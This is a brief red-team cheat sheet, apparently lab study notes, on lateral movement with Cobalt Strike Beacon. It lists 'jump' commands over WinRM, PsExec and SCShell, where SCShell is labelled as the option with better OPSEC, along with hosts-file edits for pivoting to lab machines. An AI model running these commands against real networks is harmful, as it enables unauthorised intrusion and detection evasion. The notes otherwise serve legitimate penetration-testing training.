
## Lateral Movement

### WINRM
> Check if the port is active

```powershell
netstat -ano | findstr 5985
```

> Perform the jump
```powershell
beacon> jump winrm64 lon-ws-1 smb

beacon> jump psexec64 lon-ws-1 smb
```

## Better OPSEC

```powershell
Import the SCshell.cna

beacon> jump scshell64 lon-ws-1 smb
```

## Pivoting

- Add entries to your local **/etc/hosts** ADMIN POWERSHELL
```powershell
Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value '10.10.120.1 lon-dc-1'
Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value '10.10.120.10 lon-ws-1'
```
